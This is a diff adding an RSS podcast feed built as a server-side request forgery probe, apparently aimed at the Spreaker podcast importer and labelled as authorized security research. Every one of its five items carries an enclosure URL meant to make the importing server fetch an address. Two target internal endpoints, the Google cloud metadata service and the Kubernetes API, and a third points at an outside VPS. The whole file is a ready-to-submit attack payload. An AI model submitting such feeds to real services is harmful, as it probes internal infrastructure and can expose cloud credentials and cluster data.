@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>Spreaker SSRF Oracle Matrix</title>
+<description>Security research feed for authorized SSRF testing</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<item>
+<title>O1 httpbin 403</title>
+<description>Oracle test 1</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/o1</guid>
+<enclosure url="http://httpbin.org/status/403" length="1024" type="audio/mpeg"/>
+</item>
+<item>
+<title>O2 html response</title>
+<description>Oracle test 2</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/o2</guid>
+<enclosure url="http://example.com/" length="1024" type="audio/mpeg"/>
+</item>
+<item>
+<title>O3 valid mp3 vps</title>
+<description>Oracle test 3</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/o3</guid>
+<enclosure url="http://129.226.203.245/episode.mp3" length="1024" type="audio/mpeg"/>
+</item>
+<item>
+<title>O4 metadata internal</title>
+<description>Oracle test 4</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/o4</guid>
+<enclosure url="http://metadata.google.internal/computeMetadata/v1/" length="1024" type="audio/mpeg"/>
+</item>
+<item>
+<title>O5 k8s internal</title>
+<description>Oracle test 5</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/o5</guid>
+<enclosure url="http://kubernetes.default.svc/api/v1/namespaces/default" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
